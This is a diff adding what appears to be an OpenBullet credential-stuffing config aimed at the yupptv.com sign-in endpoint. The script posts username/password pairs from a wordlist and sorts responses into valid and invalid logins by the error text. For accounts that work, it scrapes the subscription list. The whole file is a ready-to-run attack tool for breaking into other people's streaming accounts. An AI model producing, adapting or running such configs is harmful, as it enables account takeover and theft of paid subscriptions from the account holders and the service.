@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "yupptv",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-08T01:05:26.1737676+02:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST POST "https://www.yupptv.com/auth/validateSignin" AutoRedirect=TRUE 
+  CONTENT "user=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+  KEYCHAIN Success OR 
+    KEY ",\"errorCode\":null" 
+PARSE "<SOURCE>" LR "<ul class=\"mysubscriptionlist clearfix\">  " "<" Recursive=FALSE -> VAR "Subscription" "" "" 
